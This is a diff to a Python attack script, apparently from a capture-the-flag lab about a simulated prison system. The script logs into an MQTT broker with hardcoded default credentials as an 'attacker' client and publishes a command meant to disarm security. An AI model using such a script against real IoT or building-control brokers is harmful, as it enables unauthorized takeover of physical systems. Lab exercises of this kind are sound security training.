@@ -17,6 +17,14 @@ BROKER_PORT = 1883
 MQTT_USERNAME = "iotuser"     # Username for MQTT
 MQTT_PASSWORD = "iot"         # Password for MQTT
 
+# --- Flag Verification Setup (Not used in this version, but kept for context) ---
+# FLAG_CHANNEL_TOPIC = "prison/system/flag_channel"
+# SUCCESS_FLAG_PAYLOAD = "{{SECURITY-DISARMED}}"
+# WAIT_TIMEOUT = 10 # Seconds to wait for the flag confirmation
+
+# --- Global flag for confirmation (Not used in this version) ---
+# confirmation_event = threading.Event() # Not needed
+
 # --- MQTT Callbacks ---
 def on_connect(client, userdata, flags, rc):
     if rc == 0:
@@ -25,20 +33,28 @@ def on_connect(client, userdata, flags, rc):
         publish_command(client)
     else:
         print(f"[!] MQTT Connection failed with code {rc}. Check broker details and credentials.")
-        client.disconnect() # Disconnect if connection failed
+        # Try to signal disconnect or exit if connection fails early
+        try:
+             client.disconnect()
+             client.loop_stop() # Stop loop if connect fails
+        except Exception:
+             pass # Ignore errors during early exit cleanup
+        sys.exit(1) # Exit script if connection fails
 
 def on_publish(client, userdata, mid):
     print(f"[+] Command '{COMMAND_PAYLOAD}' successfully published to '{TARGET_TOPIC}' (MID: {mid}).")
     print("[*] Check the hidden website for status change!")
     # Disconnect after successful publish
-    time.sleep(0.5) # Short delay to ensure message is sent
-    client.disconnect()
+    time.sleep(0.5) # Short delay to ensure message is likely sent by broker
+    client.disconnect() # This will eventually stop loop_forever
 
 def on_disconnect(client, userdata, rc):
-     # This might be called normally after publish or on error
-     if rc != 0:
+     # This is called both on intentional disconnect and errors
+     if rc == 0:
+         print("[*] MQTT connection closed gracefully.")
+     else:
          print(f"\n[!] Disconnected unexpectedly from MQTT broker (code: {rc}).")
-     print("[*] MQTT connection closed.")
+     # loop_forever() will exit upon disconnect
 
 
 def publish_command(client):
@@ -67,13 +83,23 @@ if __name__ == "__main__":
         print("        with the information found during your recon.")
         sys.exit(1)
 
-    # Further validation could be added here if needed (e.g., check topic format)
     print(f"[*] Target Topic:     {TARGET_TOPIC}")
     print(f"[*] Command Payload:  {COMMAND_PAYLOAD}")
 
-    client = mqtt.Client(client_id=f"attacker-lightsout-{time.time()}") # Unique client ID
+    # Use the correct callback API version
+    # If using paho-mqtt v2.0.0 or later, use: mqtt.CallbackAPIVersion.VERSION2
+    # If using older versions (like 1.x), use: mqtt.CallbackAPIVersion.VERSION1
+    # Add this check or specify the version if you know it:
+    try:
+        # Attempt to use V2 first (for newer paho-mqtt)
+        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"attacker-lightsout-{time.time()}")
+    except AttributeError:
+        # Fallback to V1 if V2 is not available (older paho-mqtt)
+        print("[INFO] Using older MQTT Callback API Version 1.")
+        client = mqtt.Client(client_id=f"attacker-lightsout-{time.time()}")
+
     client.on_connect = on_connect
-    client.on_publish = on_publish # Callback when publish completes (for QoS>0)
+    client.on_publish = on_publish
     client.on_disconnect = on_disconnect
 
     if MQTT_USERNAME and MQTT_PASSWORD:
@@ -88,9 +114,18 @@ if __name__ == "__main__":
 
     except ConnectionRefusedError:
          print(f"\n[!] ERROR: Connection refused. Broker might be down or inaccessible.")
+    except KeyboardInterrupt:
+         print("\n[*] Script interrupted by user.")
     except Exception as e:
         print(f"\n[!] An unexpected error occurred: {e}")
     finally:
-        # Loop may have already stopped, but ensure it is stopped.
-        client.loop_stop(force=True) # Force stop if still running
+        print("[*] Cleaning up MQTT connection (if loop stopped)...")
+        # Ensure loop is stopped WITHOUT the 'force' argument
+        # Check if loop_stop is needed (loop_forever usually exits on disconnect)
+        try:
+            # loop_stop should ideally not be needed after loop_forever exits due to disconnect
+            # but call it just in case to be safe, ignore errors if already stopped.
+             client.loop_stop() # REMOVED force=True
+        except Exception as stop_err:
+            pass # Ignore potential errors if loop already stopped.
         print("[*] Script finished.")
